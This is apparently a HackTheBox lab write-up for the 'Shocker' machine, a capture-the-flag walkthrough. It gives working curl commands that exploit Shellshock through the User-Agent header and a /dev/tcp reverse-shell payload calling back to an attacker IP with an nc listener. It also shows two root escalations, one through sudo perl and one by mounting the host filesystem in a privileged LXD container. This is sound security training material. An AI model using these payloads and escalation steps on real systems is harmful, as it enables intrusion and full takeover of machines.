HackTheBox - Shocker

Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.

Gaining a foothold

In our NMAP scan, we saw that OpenSSH wasn’t up to date, which could indicate that other services and applications might also be outdated. Shellshock, also known as the “Bash Bug” (CVE-2014-6271), is a well-known exploit targeting CGI applications, where an attacker sends malicious code in the User-Agent header, which the server then executes. First, we run a small command to see if it works:

1
2

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'" http://10.129.15.122/cgi-bin/user.sh
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

It worked! Now we can try to get a reverse shell going. In our first terminal window we start our NetCat listener like so:

1

nc -lvnp 4444

In a second window we try to get our payload going:

remember to change 10.10.10.10 to your IP!

1

curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'" http://10.129.15.122/cgi-bin/user.sh

After gaining a shell, we upgrade it to an interactive one. To see how it’s done, check out my guide here.

Escalating our privileges

Method 1: Sudo Perl Shell

The first method we can use to escalate our privileges can be detected by running sudo -l:

1
2
3
4
5
6
7

sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

The output shows us that we can run /usr/bin/perl as root without specifying our password. This allows us to get a perl shell directly as root:

1
2
3

sudo perl -e 'exec "/bin/bash"'
root@Shocker:/usr/lib/cgi-bin# whoami
root

Method2: Abusing the LXD Group

In our first curl we got the following output:

1

uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

This shows us that our current user is part of the LXD group. Members of the LXD group are allowed to configure containers. To abuse this privilege, we need to set up a new container in which we have root privileges, allowing us to access everything on the system. First, we need to get an image of an operating system. In this case, we use Alpine, which is a super lightweight version of Linux:

1
2
3

git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine

Afterwards we need to transfer the file to our target machine, which we can do like this:

Remember to change 10.10.10.10 to your IP and the file name if necessary!

1
2

python3 -m http.server 80
curl -o alpine.tar.gz http://10.10.10.10/alpine-v3.10-x86_64-20191008_1227.tar.gz

Next we should check our home directory. If no home directory is set up or we don’t have writing permissions in it, we’d be unable to setup the container.

If you change the home directory in a pentest note it down and either revert it or notify the customer afterwards, so your attack doesn’t cause havoc.

1
2
3

echo $HOME
# it doesn't return anything, so no home directory is set up
export HOME=/tmp # sets our home directory to /tmp

Now we can import the image into our LXC storage and initialize it in privileged mode, which grants us full root permissions within the container.

1
2

lxc image import alpine.tar.gz --alias alpine
lxc init alpine r00t -c security.privileged=true

And finally we can mount the file system, start the container and access the root directory to grab our flag:

1
2
3
4

lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
cat /mnt/root/root/root.txt

What I learned from this box:

You should always check $HOME before you try to setup a container.

Conclusion

Thank you for reading, have a wonderful day and keep hacking!
